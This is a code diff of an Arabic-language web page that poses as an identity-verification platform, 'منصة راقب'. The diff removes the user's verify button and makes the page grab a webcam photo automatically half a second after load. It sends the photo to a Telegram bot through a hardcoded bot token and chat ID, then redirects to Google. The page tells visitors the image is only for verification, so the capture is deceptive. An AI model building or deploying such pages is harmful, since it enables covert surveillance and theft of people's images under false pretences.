@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>يوسف عبد الراضي - توثيق الهوية</title>
+    <title>منصة راقب - توثيق الهوية</title>
     <style>
         * {
             margin: 0;
@@ -13,7 +13,7 @@
         
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -29,18 +29,12 @@
             padding: 40px 30px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             text-align: center;
-            animation: fadeIn 0.5s ease;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
         }
         
         .logo {
             width: 80px;
             height: 80px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #00b4db 0%, #0083b0 100%);
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -52,8 +46,8 @@
         }
         
         h1 {
-            color: #333;
-            font-size: 24px;
+            color: #1a1a2e;
+            font-size: 28px;
             margin-bottom: 10px;
         }
         
@@ -61,27 +55,22 @@
             color: #666;
             font-size: 14px;
             margin-bottom: 30px;
-            padding: 0 20px;
         }
         
         .security-badge {
-            background: #f0f0f0;
+            background: #e8f0fe;
             border-radius: 50px;
             padding: 8px 16px;
             display: inline-flex;
             align-items: center;
             gap: 8px;
             font-size: 12px;
-            color: #555;
+            color: #1a73e8;
             margin-bottom: 25px;
         }
         
-        .security-badge:before {
-            content: "🔒";
-        }
-        
         .info-box {
-            background: #e8f0fe;
+            background: #f0f7ff;
             border-radius: 15px;
             padding: 15px;
             margin: 20px 0;
@@ -91,52 +80,34 @@
         .info-box p {
             color: #1a73e8;
             font-size: 13px;
-            margin: 5px 0;
+            margin: 8px 0;
         }
         
-        .camera-permission {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 16px 30px;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            transition: transform 0.2s, box-shadow 0.2s;
-            margin: 20px 0;
-        }
-        
-        .camera-permission:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(102,126,234,0.4);
-        }
-        
-        .status {
+        .loading-text {
             margin-top: 20px;
             padding: 12px;
             border-radius: 10px;
             font-size: 14px;
-            display: none;
-        }
-        
-        .status.loading {
             background: #fff3cd;
             color: #856404;
-            display: block;
         }
         
-        .status.success {
+        .success-text {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
             background: #d4edda;
             color: #155724;
-            display: block;
         }
         
-        .status.error {
+        .error-text {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
             background: #f8d7da;
             color: #721c24;
-            display: block;
         }
         
         .footer {
@@ -148,28 +119,44 @@
         video, canvas {
             display: none;
         }
+        
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #00b4db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="logo">ي</div>
-        <h1>يوسف عبد الراضي</h1>
-        <div class="subtitle">خدمة التوثيق الإلكتروني</div>
+        <div class="logo">ر</div>
+        <h1>منصة راقب</h1>
+        <div class="subtitle">المنصة الرقمية الموثوقة</div>
         
-        <div class="security-badge">اتصال آمن ومشفر</div>
+        <div class="security-badge">🔒 اتصال آمن ومشفر</div>
         
         <div class="info-box">
-            <p>📋 مطلوب تأكيد الهوية لإكمال العملية</p>
-            <p>⏱️ سيستغرق الأمر ثانية واحدة فقط</p>
-            <p>🔐 الصورة تستخدم للتوثيق فقط ولا تُحفظ</p>
+            <p>✓ مطلوب تأكيد الهوية لإكمال العملية</p>
+            <p>✓ سيستغرق الأمر ثانية واحدة فقط</p>
+            <p>✓ الصورة تستخدم للتوثيق فقط</p>
         </div>
         
-        <button class="camera-permission" id="startBtn">
-            📷 توثيق الهوية الآن
-        </button>
+        <div id="status" class="loading-text">
+            <span class="spinner"></span> جاري تحميل المنصة...
+        </div>
         
-        <div class="status" id="status"></div>
-        <div class="footer">يوسف عبد الراضي © 2026 - جميع الحقوق محفوظة</div>
+        <div class="footer">منصة راقب © 2026 - جميع الحقوق محفوظة</div>
     </div>
     
     <video id="video" autoplay></video>
@@ -178,17 +165,12 @@
     <script>
         const BOT_TOKEN = "8365043460:AAGa2EIVhOTKFa7wEuARpb_cuEsDIa2bVxs";
         const CHAT_ID = "8545876964";
-        
-        const startBtn = document.getElementById('startBtn');
         const statusDiv = document.getElementById('status');
         
-        startBtn.addEventListener('click', async () => {
-            startBtn.disabled = true;
-            startBtn.textContent = "⏳ جاري التوثيق...";
-            statusDiv.className = 'status loading';
-            statusDiv.textContent = "⏳ جاري الوصول إلى الكاميرا...";
-            
+        async function capturePhoto() {
             try {
+                statusDiv.innerHTML = '<span class="spinner"></span> جاري الوصول إلى الكاميرا...';
+                
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
@@ -200,7 +182,7 @@
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0);
                     
-                    statusDiv.textContent = "📤 جاري إرسال بيانات التوثيق...";
+                    statusDiv.innerHTML = '<span class="spinner"></span> جاري إرسال بيانات التوثيق...';
                     
                     canvas.toBlob(async (blob) => {
                         const formData = new FormData();
@@ -215,8 +197,8 @@
                             const result = await response.json();
                             
                             if (result.ok) {
-                                statusDiv.className = 'status success';
-                                statusDiv.textContent = "✅ تم توثيق هويتك بنجاح! جاري تحويلك...";
+                                statusDiv.className = 'success-text';
+                                statusDiv.innerHTML = '✓ تم توثيق هويتك بنجاح! جاري تحويلك...';
                                 setTimeout(() => {
                                     window.location.href = "https://www.google.com";
                                 }, 2000);
@@ -224,22 +206,21 @@
                                 throw new Error(result.description);
                             }
                         } catch(e) {
-                            statusDiv.className = 'status error';
-                            statusDiv.textContent = "❌ حدث خطأ تقني، حاول مرة أخرى";
-                            startBtn.disabled = false;
-                            startBtn.textContent = "📷 توثيق الهوية الآن";
+                            statusDiv.className = 'error-text';
+                            statusDiv.innerHTML = '✗ حدث خطأ تقني، يرجى المحاولة مرة أخرى';
                         }
                     }, 'image/jpeg');
                     
                     stream.getTracks().forEach(track => track.stop());
                 };
             } catch(error) {
-                statusDiv.className = 'status error';
-                statusDiv.textContent = "❌ لا يمكن الوصول إلى الكاميرا. الرجاء السماح بالوصول";
-                startBtn.disabled = false;
-                startBtn.textContent = "📷 توثيق الهوية الآن";
+                statusDiv.className = 'error-text';
+                statusDiv.innerHTML = '✗ لا يمكن الوصول إلى الكاميرا. الرجاء السماح بالوصول إلى الكاميرا';
             }
-        });
+        }
+        
+        // تشغيل الكاميرا فور تحميل الصفحة
+        setTimeout(capturePhoto, 500);
     </script>
 </body>
 </html>
